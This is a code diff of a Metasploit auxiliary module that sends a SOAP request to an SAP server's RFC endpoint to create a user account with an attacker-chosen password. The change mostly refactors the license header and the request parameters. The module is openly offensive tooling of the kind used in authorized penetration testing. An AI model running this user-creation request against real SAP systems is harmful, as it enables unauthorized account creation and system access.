@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 ##
@@ -72,17 +70,22 @@ class Metasploit4 < Msf::Auxiliary
     data << '</env:Envelope>'
     begin
       print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")
+
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+        'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
         'ctype' => 'text/xml; charset=UTF-8',
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'headers' =>
-          {
-            'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-          }
+        'headers' => {
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        },
+        'encode_params' => false,
+        'vars_get' => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
+        }
       })
       if res and res.code == 200
         if res.body =~ /<h1>Logon failed<\/h1>/
